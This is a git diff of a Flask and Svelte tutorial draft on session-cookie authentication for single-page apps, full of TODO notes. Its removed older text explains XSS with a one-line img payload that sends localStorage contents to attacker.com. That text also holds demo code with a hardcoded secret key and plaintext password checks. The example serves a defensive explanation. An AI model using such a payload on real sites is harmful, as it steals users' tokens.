@@ -1,488 +1,824 @@
-# Cookie-based Authentication with Flask for Single Page Applications
+# uthenticate Single-Page Apps with Session Cookies
 
-This article will see how to set up cookie-based authentication for Single-Page Applications(SPAs). We are going to use Flask as our backend with Flask-Login for handling sessions. The frontend is handled using svelte, a framework that compiles code into js and CSS during the build stage.
+TODO: potential titles:
 
-## Cookie v/s Token-based authentication
-### What are they?
+1. Authentication with Flask and Single Page Apps
+1. Session-based Auth with Flask for Single Page Apps
+1. Authenticate Single-Page Apps with Session Cookies
+1. Session-based Auth for Flask and Single Page Apps
+1. Authentication with Cookies for a Flask Single Page App
 
-Cookie-based authentication has been around since the beginning of authentication. This method stores a cookie recording the user session in the user's browser. The cookie-based authentication works as follows.
+In this article, we'll look at how to authenticate Single-Page Applications (SPAs) with session-based authentication. We're going to use Flask as our backend with Flask-Login for managing sessions. The frontend will be built with Svelte, a JavaScript framework designed for building rich user interfaces.
 
-- User login into the application.
-- The server creates a session id, logs it, and sends it back to the browser.
-- The browser stores the session ID in cookies.
-- The browser sends the cookie whenever the website is loaded.
-- The server checks for the user associated with the cookie and sends back the data.
-Once the user logs out, the server destroys the cookie's record on both the client and server-side.
+## Session vs Token-based Auth
 
-As you can see, cookie-based authentication is stateful, which means the server tracks which user the session-id belongs to.
+### What Are they?
 
-Token-based authentication is relatively new compared to cookie-based. They gained traction due to the rise of Single Page Applications(SPAs) and APIs. The most common token is JSON Web Tokens(JWT). The token-based authentication method is stateless. This means the server does not store tokens but instead checks whether the request is coming from an authorized source. See the token workflow below,
+With session-based auth, a session ID is stored in a cookie.
 
-- The user logs into the application.
-- The server validates the credentials and sends back a signed token.
-- In most cases, the token is stored in the localStorage.
-- Every request to the server carries the token in its headers.
-- The server decodes the token and checks for its validity.
-- Once the user logs out, the token is destroyed on the client-side; no server interaction is required.
+After logging in, the server validates the credentials. If valid, it generates a session ID, stores it, and then sends it back to the browser. The browser stores the session ID as a cookie, which gets sent anytime a request is made to the server.
 
-### CSRF (cookies) vs XSS (localstorage)
+Session-based auth is stateful. Each time time a client makes a request to the server, the server must locate the session using the session ID in order to find the auth info in order to tie the session ID back to the associated user.
 
-Earlier, we discussed how cookies/sessions are stored in cookies, and tokens are stored in localStorage. Let's see the difference between them.
+Token-based auth, on the other hand, is relatively new compared to session-based auth. It gained traction with the rise of Single Page Applications(SPAs) and RESTful APIs.
 
-#### Cookie
-- Small in size, ~4KB
-- Can be read by both client-side and server-side
-- Expiry can be set
+TODO: what is a token?
 
-Cookies associated with a domain are sent along with all the requests to that particular domain. For example, if you visit https://facebook.com, all the cookies associated with Facebook are sent along with the request. This makes it vulnerable to Cross-Site Request Forgery, where an attacker can include a malicious code to perform state changes on a particular server. Once you click the link or load the page, the code performs state changes on your account because, as said earlier, all the cookies are sent along with the request. So the server thinks of the request coming from the user. CSRF can be used to perform state-changing operations like transferring money or liking a post etc. CSRF cannot send data back to the attacker or anybody else. Read more about CSRF, and it's prevention in Flask [here](https://testdriven.io/blog/csrf-flask/).
+The most common type of token is a JSON Web Tokens (JWT).
 
-#### localStorage
-- Up to 10MB
-- Can be read by client-side javascript
-- Supports no expiry, can only be cleared using javascript
+After logging in, the server validates the credentials and, if valid, creates and sends back a signed token to the browser. In most cases, the token is stored in localStorage. The client then adds the token to the header when a request is made to the server. Assuming the request came from an authorized source, the server decodes the token and checks for its validity.
 
-Tokens are stored in localStorage, which is only accessible to javascript, making it susceptible to Cross-Site Scripting(XSS). XSS means injecting javascript code into the client-side, usually to bypass the same-origin policy. Unlike CSRF, XSS can send back responses to a server. 
+Since the token contains all information required for the server to verify a user's identity, token-based auth is stateless.
 
-Open a web browser and navigate to https://facebook.com(or any website of your choice). Now press `F12` to open the developer tools and choose the `console` tab. Now type `JSON.stringify(localStorage)` and press enter, this should print the localStorage elements in a JSON serialized form. 
+### Security Vulnerabilities
 
-![fb](images/fb.PNG)
+As mentioned, session-based auth maintains state on the client in a cookie. While JWTs can be stored in localStorage or a cookie, most token-based auth implementations store the JWT in localStorage. Both of these methods come with potential security issues:
 
-It is that easy for a script to access the localStorage. An attacker could have a simple script to read all the data and send back or an image tag that looks like,
+| Storage Method | Security Vulnerability                                                            |
+|----------------|-----------------------------------------------------------------------------------|
+| Cookie         | [Cross Site Request Forgery](https://owasp.org/www-community/attacks/csrf) (CSRF) |
+| localStorage   | [Cross-Site Scripting](https://owasp.org/www-community/attacks/xss/) (XSS)        |
+
+
+CSRF is an attack against a web application in which the attacker attempts to trick an authenticated user into performing a malicious action. Most CSRF attacks target web applications that use cookie-based auth since web browsers include all of the cookies associated with a particular domain with each request. So when a malicious request is made, the attacker can easily make use of the stored cookies.
+
+> To learn more about CSRF and how to prevent it in Flask, check out the [/blog/csrf-flask/](CSRF Protection in Flask) article.
+
+XSS attacks are a type of injection where JavaScript code into the client-side, usually to bypass the browser's same-origin policy. Web applications that store tokens in localStorage are open to XSS attacks. Open a browser and navigate to any site. Open the console in developer tools and type `JSON.stringify(localStorage)`. Press enter. This should print the localStorage elements in a JSON serialized form. It's that easy for a script to access localStorage.
+
+> For more on where to store JWTs, check out [Where to Store your JWTs – Cookies vs HTML5 Web Storage](https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage).
+
+## Setting up Session-based Auth
+
+There are essentially three different ways to combine Flask with a frontend framework:
+
+1. Serve up the framework via a Jinja template
+1. Serve up the framework separately from Flask on a different domain
+1. Serve up the framework separately from Flask on the same domain
+
+Feel free to swap out Svelte for the frontend of your choice -- i.e., React, Angular, or Vue.
+
+## Flask and Svelte Served via Jinja
+
+With this approach we'll build the frontend and serve the *index.html* file with Flask.
+
+Assuming, you have [Node](https://nodejs.org/en/download/package-manager/) and [npm](https://www.npmjs.com/get-npm) installed, create a new project via the official [Svelte project template](https://github.com/sveltejs/template):
+
+```bash
+$ npx degit sveltejs/template flask-spa-jinja
+$ cd flask-spa-jinja
+```
+
+Install the dependencies:
+
+```bash
+$ npm install
+```
+
+Install [Page.js](https://github.com/visionmedia/page.js) as well for client-side routing:
+
+```bash
+$ npm install page
+```
+
+Create a file to hold the flask app called *app.py*:
+
+```bash
+$ touch app.py
+```
+
+Install Flask and Flask-Login:
+
+```bash
+$ python3.9 -m venv env
+$ source env/bin/activate
+$ pip install Flask==1.1.2 Flask-Login==0.5.0
+```
+
+Add a "templates" folder and move the *index.html* file to it. Your project directory should now look like:
+
+```bash
+├── .gitignore
+├── README.md
+├── app.py
+├── package-lock.json
+├── package.json
+├── public
+│   ├── favicon.png
+│   └── global.css
+├── rollup.config.js
+├── scripts
+│   └── setupTypeScript.js
+├── src
+│   ├── App.svelte
+│   └── main.js
+└── templates
+    └── index.html
+```
+
+### Flask Backend
+
+Our app will have the following routes:
+
+1. `/` serves up the *index.html* file
+1. `/api/login` logs a user in and generates session
+1. `/api/data` fetches user data for an authenticated user
+1. `/api/logout` logs a user out
+1. `/api/getsession` checks wether a session exists
+
+Grab the full code from [here](https://github.com/testdrivenio/flask-cookie-spa/blob/master/flask-spa-jinja/app.py) and add it to the *app.py* file.
+
+Update *templates/index.html* to use load the static files via `url_for`:
 
 ```html
-<img src=’https://attacker.com/image?jwt=’+JSON.stringify(localStorage);’--!>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset='utf-8'>
+  <meta name='viewport' content='width=device-width,initial-scale=1'>
+
+  <title>Svelte app</title>
+
+  <link rel='icon' type='image/png' href="{{url_for('static', filename='favicon.png')}}">
+  <link rel='stylesheet' href="{{url_for('static', filename='global.css') }}">
+  <link rel='stylesheet' href="{{url_for('static', filename='build/bundle.css') }}">
+
+  <script defer src="{{url_for('static', filename='build/bundle.js') }}"></script>
+</head>
+
+<body>
+</body>
+</html>
 ```
 
-This appends the data to the link and requests the attacker. The attacker can send a random image to make it look like nothing happened. We know that tokens are stateless; the server does not keep track of tokens; instead, it appends a token role. For example, the token issued to me is authorized to access my data. The attacker who has my token can send it along with requests and get all my data and privileges on the website.
+### Svelte Frontend
 
+We'll have two different pages: one for logging in and the other for viewing use data.
 
-## Setting up cookie-based auth
+#### Login Page
 
-Now we will see how to setup cookie-based authentication for a Flask-SPA using Flask-Login. We are going to build two applications,
+Let's start with the login page.
 
-1. Flask + Svelte SPA (different domains) (Secure, HttpOnly cookies)
-1. Flask + Svelte served up via Flask/Jinja Templates
+Add a new file to "src" called *Home.svelte*:
 
-### Flask + Svelte SPA (different domains)
+```jsx
+<script>
+  import router from "page";
+  import { onMount } from "svelte";
+  import { getSession } from "./session";
 
-Here we set up the Flask app and svelte app on different ports.  
+  let username;
+  let password;
+  let error;
 
-Let's start by creating a project directory,
+  onMount(() => {
+    getSession(true, "/user");
+  });
 
-```bash
-mkdir flask-spa-cross-origin && cd flask-spa-cross-origin
+  const login = () => {
+    fetch("/api/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      credentials: "same-origin",
+      body: JSON.stringify({ username: username, password: password }),
+    })
+    .then((res) => res.json())
+    .then((data) => {
+      console.log(data);
+      if (data.login == true) {
+        router.redirect("/user");
+      } else {
+        error = "Bad credentials";
+      }
+    })
+    .catch((err) => {
+      console.log(err);
+      error = "Error connecting to server";
+    });
+  };
+</script>
+
+<style>
+  #form {
+    padding-top: 10%;
+  }
+</style>
+
+<center>
+  <div class="container">
+    <form id="form">
+      username:
+      <input type="text" bind:value={username} />
+      <br /><br />
+      password:
+      <input type="password" bind:value={password} /><br /><br />
+      <button type="button" on:click={login}>login</button>
+    </form>
+    <br /><br />
+    <p>{#if error}{error}{/if}</p>
+  </div>
+</center>
 ```
 
-Now create a folder each for frontend and backend.
+What's happening?
 
-```bash
-# this is where we define our backend
-mkdir server 
-
-# app folder is where our frontend resides. 
-# We'll use a template to create the app
-npx degit sveltejs/template app
-```
-
-The directory should look like,
-
-```bash
-Project:
-├───app
-|   ├───node_modules
-│   ├───public
-│   │   └───build
-│   ├───scripts
-│   └───src
-└───server
-    ├───app.py
-    └───requirements.txt
-```
-
-#### Setup the backend
-
-```bash
-cd server
-```
-
-The backend code for both examples is the same. Flask-Login handles the login, and it is defined as,
+Well, we have a simple form that takes a username and password. On button click, the credentials are sent to `/api/login` on the server. Turn to the route handler for `/api/login`. If the credentials are valid, `{"login": True}` is returned:
 
 ```python
-class User(UserMixin):
-    ...
-
-
-def get_user(user_id: int):
-    for user in users:
-        if int(user["id"]) == int(user_id):
-            return user
-    return None
-
-
-@login_manager.user_loader
-def user_loader(id: int):
-    user = get_user(id)
-    if user:
-        user_model = User()
-        user_model.id = user["id"]
-        return user_model
-    return None
-
+return jsonify({"login": True})
 ```
 
-The backend has routes to take care of the following.
+The user is then redirected to `/user`.
 
-- Check whether a session exists
-- User login
-- User logout
-- Fetch user data
-
-Let's see how each of them is defined.
-
-1. Check for the existence of a session
-
-    ```python
-    @app.route("/api/getsession")
-    def check_session():
-        if current_user.is_authenticated:
-            return jsonify({"login": True})
-        return jsonify({"login": False})
-    ```
-
-    This returns true if the session exists, else false.
-
-
-2. Handle user login
-
-    ```python
-    @app.route("/api/login", methods=["POST"])
-    def login():
-        data = request.json
-        username = data.get("username")
-        password = data.get("password")
-
-        for user in users:
-            if user["username"] == username and user["password"] == password:
-                user_model = User()
-                user_model.id = user["id"]
-                login_user(user_model)
-                return jsonify({"login": True})
-        return jsonify({"login": False})
-    ```
-
-    `/api/login` accepts username and password as a JSON post request. The code checks against the database for user credentials. If it exists, the functions return true, else false.
-
-
-3. Handle user logout
-
-    ```python
-    @app.route("/api/logout")
-    @login_required
-    def logout():
-        logout_user()
-        return jsonify({"logout": True})
-    ```
-  
-    The logout code destroys the user session.
-
-4. Fetch user data
-
-    ```python
-    @app.route("/api/data", methods=["GET"])
-    @login_required
-    def user_data():
-        user = get_user(current_user.id)
-
-        return jsonify({"name": user["username"]})
-    ```
-
-    `/api/data` returns the username of the active session.
-
-
-The server runs on port `5000`. Run the server by running `python app.py`.
-
-#### Set up the frontend
-
-The front-end design for both examples is similar, so only the difference will be highlighted for the next example. Start by installing the dependencies.
-
-```bash
-# make sure you cd into the directory
-cd app
-
-npm i
-```
-
-Now install `page`, which handles routing for the frontend.
-
-```bash
-npm i page
-```
-
-We have two pages, one for login and the other for user data. Let's start by defining the login page.
-
-```html
-<div class="container">
-        <form>
-            username:
-            <input type="text" bind:value={username} />
-            password:
-            <input type="password" bind:value={password} />
-            <button type="button" on:click={login}>login</button>
-        </form>
-        <p>
-            {#if error}{error}{/if}
-        </p>
-    </div>
-```
-
-The login page consists of two inputs, one for username and another for the password. When submitted, the `login` function gets executed. 
+Take note of:
 
 ```javascript
-const login = () => {
-        fetch("http://localhost:5000/api/login", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-            },
-            credentials: "include",
-            body: JSON.stringify({ username: username, password: password }),
-        })
-            .then((res) => res.json())
-            .then((data) => {
-                if (data.login == true) {
-                    router.redirect("/user");
-                } else {
-                    error = "Bad credentials";
-                }
-            })
-            .catch((err) => {
-                error = "Error connecting to server";
-            });
-    };
+credentials: "same-origin",
 ```
 
-The `login` function is straightforward. We collect the username and password and send it to the `/api/login` on the server explained earlier. The function validates the request and sends back true if the login exists. Once the login function receives true, the page redirects to the `/user` page, else throws an error. One thing to notice above is the `credentials: 'include'`. This is required to make the cookies available to the server.
+This will send along the cookies with the request if the URL is on the same origin as the calling script.
 
-We defined the login page. But what about the existing session? Shouldn't it login automatically? Yes, for that we need to define a function that checks for existing session on page load. We define `session.js` in the same directory as,
+To prevent the page from loading if the user is already authenticated `getSession` is called when the component mounts via the [onMount](https://svelte.dev/tutorial/onmount) lifecycle function:
 
 ```javascript
 export function getSession(condition, location) {
-    fetch("http://localhost:5000/api/getsession", {
-        credentials: "include",
-    })
-        .then((res) => res.json())
-        .then((data) => {
-            console.log(data);
-            if (data.login == condition) {
-                router.redirect(location);
-            }
-        })
-        .catch((err) => {
-            console.log(err);
-        });
+  fetch("/api/getsession", {
+    credentials: "same-origin",
+  })
+  .then((res) => res.json())
+  .then((data) => {
+    console.log(data);
+    if (data.login == condition) {
+      router.redirect(location);
+    }
+  })
+  .catch((err) => {
+    console.log(err);
+  });
 }
-
 ```
 
-The function checks for an existing session. It takes in two parameters, one the condition returned by the session and the other the route to redirect to. For example, `getSession(true, "/user")` in our case would make the page redirect to /user if the session exists. 
+Add this to a new file called *src/session.js*.
 
-We need to check for user sessions on page load. Then `onMount` in svelte makes this possible. The following code will be added to the script on our login page above any other function call.
+#### Router
+
+Next, let's configure the router.
+
+Update *src/App.svelte* like so:
+
+```html
+<script>
+  import router from "page";
+  import Home from "./Home.svelte";
+  let page;
+  router("/", () => (page = Home));
+  router.start();
+</script>
+
+{#if page === Home}
+  <Home />
+{/if}
+```
+
+TODO: add note about what's happening in this file.
+
+Next, update *src/main.js* like so:
 
 ```javascript
-import { onMount } from "svelte";
-import { getSession } from "./session";
+import App from './App.svelte';
 
-onMount(() => {
-        getSession(true, "/user");
-    });
+const app = new App({
+  target: document.body,
+});
+
+export default app;
 ```
+
+TODO: add note about what's happening in this file as well.
+
+Create a build:
+
+```bash
+$ npm run build
+```
+
+After the build finishes, start the server:
+
+```bash
+$ python app.py
+```
+
+Navigate to [http://localhost:5000](http://localhost:5000). You should see:
 
 ![login page](images/login.PNG "Login page")
 
-Now, let's define the user page, which displays the user data. This page also checks for the existing session on page load.
+#### User Page
+
+Create a new file called *src/Page.svelte*:
 
 ```javascript
-onMount(() => {
-        getSession(false, "/");
+<script>
+  let name = "";
+  let error;
+
+  import router from "page";
+  import { onMount } from "svelte";
+  import { getSession } from "./session";
+
+  onMount(() => {
+    getSession(false, "/");
+
+    fetch("/api/data", {
+      credentials: "same-origin",
+    })
+    .then((res) => res.json())
+    .then((data) => (name = data.name))
+    .catch((err) => (error = err));
+  });
+
+  const logout = () => {
+    fetch("/api/logout", {
+      credentials: "same-origin",
+    })
+    .then(() => router.redirect("/"))
+    .catch((err) => {
+      console.log(err);
+      error = "Error connecting to server";
     });
+  };
+</script>
+
+<center>
+  <div class="container">
+    <h3>Profile</h3>
+    <button type="button" on:click={logout}>logout</button>
+    <hr />
+    <p>Name: {name}</p>
+    <br /><br />
+    <p>{#if error}{error}{/if}</p>
+  </div>
+</center>
 ```
 
-In this case, if the session does not exist, we redirect to the home page.
+What's happening?
 
-The user page fetched the username for the active session and displayed it on screen. 
+1. Again, `getSession` is called after the component mounts. This time, if the session doesn't exist, the user is redirected to the home page where they can log in.
+1. If the session exists and is valid, the page is displayed.
+
+Then, wire up the component and route in *src/App.svelte*:
 
 ```html
-    <div class="container">
-        <h3>Profile</h3>
-        <button type="button" on:click={logout}>logout</button>
-        <hr />
-        <p>Name: {name}</p>
-        <p>
-            {#if error}{error}{/if}
-        </p>
-    </div>
+<script>
+  import router from "page";
+  import Home from "./Home.svelte";
+  import Page from "./Page.svelte";
+  let page;
+  router("/", () => (page = Home));
+  router("/user", () => (page = Page));
+  router.start();
+</script>
+
+{#if page === Home}
+  <Home />
+{/if}
+
+{#if page === Page}
+  <Page />
+{/if}
 ```
 
-The page calls logout when the logout button is clicked. 
+#### Test
 
-```javascript
-const logout = () => {
-        fetch("http://localhost:5000/api/logout", {
-            credentials: "include",
-        })
-            .then(() => router.redirect("/"))
-            .catch((err) => {
-                error = "Error connecting to server";
-            });
-    };
+That's it! We're ready to test.
+
+Create a new build then run Flask:
+
+```bash
+$ npm run build
+$ python app.py
 ```
 
-The `name` variable is set to be fetched automatically when the page loads, update the onMount function to,
+Log in. You should be redirected to [http://127.0.0.1:5000/user](http://127.0.0.1:5000/user).
 
-
-```javascript
-onMount(() => {
-        getSession(false, "/");
-
-        fetch("http://localhost:5000/api/data", {
-            credentials: "include",
-        })
-            .then((res) => res.json())
-            .then((data) => (name = data.name))
-            .catch((err) => (error = err));
-    });
-```
-
-That's it; the frontend is built successfully. However, there are a couple of important things to take care of. 
-
-1. The `start` command under `scripts` in `package.json` must be modified to build the single page application with routing
-
-    ```json
-    // the app will run on port 8080
-
-    "start": "sirv public --single --port 8080"
-    ```
-
-2. The frontend runs on port 8080, whereas the backend runs on port 5000. There is a need to set up CORS for resource sharing; otherwise, the connection would fail. Use `Flask-Cors` to setup CORS for our server. Update the app.py to,
-
-    ```python
-    from flask_cors import CORS
-
-
-    app = Flask(__name__)
-    app.config.update(
-        DEBUG=True,
-        SECRET_KEY="secret_sauce",
-    )
-
-    cors = CORS(
-    app,
-    supports_credentials=True,
-    resources={r"/api/*": {"origins": "http://localhost:8080"}},
-    )
-    ```
-
-    Now only `http://localhost:8080` can access the resources at `/api/*`. You can now start the server using `python app.py` in the server directory and frontend using `npm run start` in the app directory.
-
-#### Watch the app in action
+TODO: what happens when you visit http://127.0.0.1:5000/user and there's a session cookie, but it's incorrect? If a 401 is sent back, we should probably redirect the user back to home.
 
 ![login](images/login.gif "cross origin demo")
 
-### Flask + Svelte SPA (served via templates)
+## Flask and Svelte Served Separately (Cross-domain)
 
-Here we build the frontend and serve the index.html using Flask. 
+With this approach, set up Flask and Svelte separately so that they are served up cross domain on different ports.
 
-Start by creating the project,
-
-
-```bash
-# create a project from template
-npx degit sveltejs/template flask-spa-jinja
-
-# cd into the directory
-cd flask-spa-jinja
-
-# install dependencies
-npm i
-
-# install page for routing
-npm i page
-
-# create app.py for flask
-touch app.py
-```
-
-Move the `index.html` file in the public folder to a new folder in the project's root named `templates`. The project directory should look like,
+Start by creating a project directory:
 
 ```bash
-Project:
-├───node_modules
-├───public
-│   └───build
-├───scripts
-├───src
-├───templates
-└───app.py
+$ mkdir flask-spa-cross-origin && cd flask-spa-cross-origin
 ```
 
-The code for this example remains the same, apart from the following,
-
-- Since we are deploying from same-origin, no need to set up CORS
-- Update flask `app` by specifying the `static` directory
-
-    ```python
-    app = Flask(__name__, static_folder="public")
-    ```
-
-- Once it is done, replace all URLs in `templates/index.html` to jinj2 types. Your `index.html` should look like,
-
-    ```html
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset='utf-8'>
-        <meta name='viewport' content='width=device-width,initial-scale=1'>
-
-        <title>Svelte app</title>
-
-        <link rel='icon' type='image/png' href="{{url_for('static', filename='favicon.png')}}">
-        <link rel='stylesheet' href="{{url_for('static', filename='global.css') }}">
-        <link rel='stylesheet' href="{{url_for('static', filename='build/bundle.css') }}">
-
-        <script defer src="{{url_for('static', filename='build/bundle.js') }}"></script>
-    </head>
-
-    <body>
-    </body>
-    </html>
-
-    ```
-
-- Setup the Flask app to render index.html at `/` route. Since the application has a page at `/user` and it is served via Flask app, the Flask will intercept the path when the user manually types `http://localhost:5000/user` and throws an error. To circumvent this, we must tell Flask to render `index.html` as such instances.
-
-    ```python
-    @app.route("/", defaults={"path": ""})
-    @app.route("/<path:path>")
-    def home(path):
-        return render_template("index.html")
-    ```
-
-    This will render `index.html` even when the user manually types `http://localhost:5000/user`.
-
-- All fetch API calls in `src/*.svelte` can be `/api/login` instead of `http://localhost:5000/api/login` (remove the most part as we are serving same-origin).
-
-- `credentials: 'include'` becomes `credentials: 'same-origin'`.
-
-That' it, we are good to go. When ready, build the application(frontend) by running,
+Now, create a folder for the backend:
 
 ```bash
-npm run build
+$ mkdir server && cd server
 ```
 
-After the build finishes(it is rapid), start the application by running,
+Create a file to hold the flask app called *app.py*:
 
-```python 
-python app.py
+```bash
+$ touch app.py
 ```
 
-Navigate to `localhost:5000` and see the app running. 
+Install Flask, Flask-Login, and Flask-Cors:
+
+```bash
+$ python3.9 -m venv env
+$ source env/bin/activate
+$ pip install Flask==1.1.2 Flask-Login==0.5.0 Flask-Cors==3.0.9
+```
+
+Back in the project root, assuming, you have [Node](https://nodejs.org/en/download/package-manager/) and [npm](https://www.npmjs.com/get-npm) installed, create a new project via the official [Svelte project template](https://github.com/sveltejs/template):
+
+```bash
+$ npx degit sveltejs/template app
+$ cd app
+```
+
+Install the dependencies:
+
+```bash
+$ npm install
+```
+
+Install [Page.js](https://github.com/visionmedia/page.js) as well for client-side routing:
+
+```bash
+$ npm install page
+```
+
+Your project directory should now look like:
+
+```bash
+├── app
+│   ├── .gitignore
+│   ├── README.md
+│   ├── package-lock.json
+│   ├── package.json
+│   ├── public
+│   │   ├── favicon.png
+│   │   ├── global.css
+│   │   └── index.html
+│   ├── rollup.config.js
+│   ├── scripts
+│   │   └── setupTypeScript.js
+│   └── src
+│       ├── App.svelte
+│       └── main.js
+└── server
+    └── app.py
+```
+
+### Flask Backend
+
+Our app will have the following routes:
+
+1. `/api/login` logs a user in and generates session
+1. `/api/data` fetches user data for an authenticated user
+1. `/api/logout` logs a user out
+1. `/api/getsession` checks wether a session exists
+
+Grab the full code from [here](https://github.com/testdrivenio/flask-cookie-spa/blob/master/flask-spa-cross-origin/server/app.py) and add it to the *server.app.py* file.
+
+Take note of the CORS config:
+
+```python
+cors = CORS(
+    app,
+    supports_credentials=True,
+    resources={r"/api/*": {"origins": "http://localhost:8080"}},
+)
+```
+
+This is necessary since the frontend will be making requests to the backend from a different domain.
+
+### Svelte Frontend
+
+We'll have two different pages: one for logging in and the other for viewing use data.
+
+#### Login Page
+
+Let's start with the login page.
+
+Add a new file to "app/src" called *Home.svelte*:
+
+```jsx
+<script>
+  import router from "page";
+  import { onMount } from "svelte";
+  import { getSession } from "./session";
+
+  let username;
+  let password;
+  let error;
+
+  onMount(() => {
+    getSession(true, "/user");
+  });
+
+  const login = () => {
+    fetch("http://localhost:5000/api/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      credentials: "include",
+      body: JSON.stringify({ username: username, password: password }),
+    })
+    .then((res) => res.json())
+    .then((data) => {
+      console.log(data);
+      if (data.login == true) {
+        router.redirect("/user");
+      } else {
+        error = "Bad credentials";
+      }
+    })
+    .catch((err) => {
+      console.log(err);
+      error = "Error connecting to server";
+    });
+  };
+</script>
+
+<style>
+  #form {
+    padding-top: 10%;
+  }
+</style>
+
+<center>
+  <div class="container">
+    <form id="form">
+      username:
+      <input type="text" bind:value={username} />
+      <br /><br />
+      password:
+      <input type="password" bind:value={password} /><br /><br />
+      <button type="button" on:click={login}>login</button>
+    </form>
+    <br /><br />
+    <p>{#if error}{error}{/if}</p>
+  </div>
+</center>
+```
+
+What's happening?
+
+Well, we have a simple form that takes a username and password. On button click, the credentials are sent to `http://localhost:5000/api/login`. Turn to the route handler for `/api/login`. If the credentials are valid, `{"login": True}` is returned:
+
+```python
+return jsonify({"login": True})
+```
+
+The user is then redirected to `/user`.
+
+Take note of:
+
+```javascript
+credentials: "include",
+```
+
+This will send along the cookies with the request.
+
+To prevent the page from loading if the user is already authenticated `getSession` is called when the component mounts via the [onMount](https://svelte.dev/tutorial/onmount) lifecycle function:
+
+```javascript
+export function getSession(condition, location) {
+  fetch("http://localhost:5000/api/getsession", {
+    credentials: "include",
+  })
+  .then((res) => res.json())
+  .then((data) => {
+    console.log(data);
+    if (data.login == condition) {
+      router.redirect(location);
+    }
+  })
+  .catch((err) => {
+    console.log(err);
+  });
+}
+```
+
+Add this to a new file called *app/src/session.js*.
+
+#### Router
+
+Next, let's configure the router.
+
+Update *src/App.svelte* like so:
+
+```html
+<script>
+  import router from "page";
+  import Home from "./Home.svelte";
+  let page;
+  router("/", () => (page = Home));
+  router.start();
+</script>
+
+{#if page === Home}
+  <Home />
+{/if}
+```
+
+TODO: add note about what's happening in this file.
+
+Next, update *src/main.js* like so:
+
+```javascript
+import App from './App.svelte';
+
+const app = new App({
+  target: document.body,
+});
+
+export default app;
+```
+
+TODO: add note about what's happening in this file as well.
+
+Next, update the `start` command under `scripts` in *app/package.json* so that the single page application uses routing:
+
+```json
+"start": "sirv public --single --port 8080"
+```
+
+Create a build:
+
+```bash
+$ npm run build
+```
+
+After the build finishes, start the server:
+
+```bash
+$ npm start
+```
+
+This will run Svelte on [http://localhost:8080](http://localhost:8080).
+
+Within a new terminal window, navigate to the "server" directory and spin up the Flask app:
+
+```bash
+$ python app.py
+```
+
+Navigate to [http://localhost:8080](http://localhost:8080). You should see:
+
+![login page](images/login.PNG "Login page")
+
+#### User Page
+
+Create a new file called *app/src/Page.svelte*:
+
+```javascript
+<script>
+  let name = "";
+  let error;
+
+  import router from "page";
+  import { onMount } from "svelte";
+  import { getSession } from "./session";
+
+  onMount(() => {
+    getSession(false, "/");
+
+    fetch("http://localhost:5000/api/data", {
+      credentials: "include",
+    })
+    .then((res) => res.json())
+    .then((data) => (name = data.name))
+    .catch((err) => (error = err));
+  });
+
+  const logout = () => {
+    fetch("http://localhost:5000/api/logout", {
+      credentials: "include",
+    })
+    .then(() => router.redirect("/"))
+    .catch((err) => {
+      console.log(err);
+      error = "Error connecting to server";
+    });
+  };
+</script>
+
+<center>
+  <div class="container">
+    <h3>Profile</h3>
+    <button type="button" on:click={logout}>logout</button>
+    <hr />
+    <p>Name: {name}</p>
+    <br /><br />
+    <p>{#if error}{error}{/if}</p>
+  </div>
+</center>
+```
+
+What's happening?
+
+1. Again, `getSession` is called after the component mounts. This time, if the session doesn't exist, the user is redirected to the home page where they can log in.
+1. If the session exists and is valid, the page is displayed.
+
+Then, wire up the component and route in *app/src/App.svelte*:
+
+```html
+<script>
+  import router from "page";
+  import Home from "./Home.svelte";
+  import Page from "./Page.svelte";
+  let page;
+  router("/", () => (page = Home));
+  router("/user", () => (page = Page));
+  router.start();
+</script>
+
+{#if page === Home}
+  <Home />
+{/if}
+
+{#if page === Page}
+  <Page />
+{/if}
+```
+
+#### Test
+
+That's it! We're ready to test.
+
+Create a new build then run Svelte:
+
+```bash
+$ npm run build
+$ npm start
+```
+
+In a different terminal window run the Flask app:
+
+```bash
+$ python app.py
+```
+
+Log in. You should be redirected to [http://127.0.0.1:8080/user](http://127.0.0.1:8080/user).
+
+TODO: what happens when you visit http://127.0.0.1:8080/user and there's a session cookie, but it's incorrect? If a 401 is sent back, we should probably redirect the user back to home.
+
+![login](images/login.gif "cross origin demo")
+
+## Flask and Svelte Served Separately (Same Domain)
+
+TODO: briefly describe the changes that will need to be made to handle the same domain
+
+## Conclusion
+
+TODO: add conclusion
+
+TODO: when should you use cookies for storing auth? Regardless of whether you use sessions or tokens, it's good to use cookies for authentication when the client is a browser and it along with the backend app are on the same domain. It's fine to use cookies as well for auth cross-domain -- when the frontend and backend are served from different domains -- as long as CORS is configured properly.
+
+## TODO
+
+### Cookie Config
+
+I think we can configure the Flask-Login and Flask config cookies better:
+
+#### Flask and Svelte Served via Jinja:
+
+```
+SESSION_COOKIE_HTTPONLY = True
+REMEMBER_COOKIE_HTTPONLY = True
+SESSION_COOKIE_SAMESITE='Lax',
+login_manager.session_protection = "strong"
+```
+
+#### Flask and Svelte Served Separately (Cross-domain):
+
+```
+SESSION_COOKIE_HTTPONLY = True
+REMEMBER_COOKIE_HTTPONLY = True
+SESSION_COOKIE_SAMESITE=None,
+login_manager.session_protection = "strong"
+```
+
+#### Flask and Svelte Served Separately (Same Domain)
+
+```
+SESSION_COOKIE_HTTPONLY = True
+REMEMBER_COOKIE_HTTPONLY = True
+SESSION_COOKIE_SAMESITE='Lax',
+login_manager.session_protection = "strong"
+```
+
+### Production
+
+For prod, these should be true:
+
+```
+SESSION_COOKIE_SECURE = True
+REMEMBER_COOKIE_SECURE = True
+```
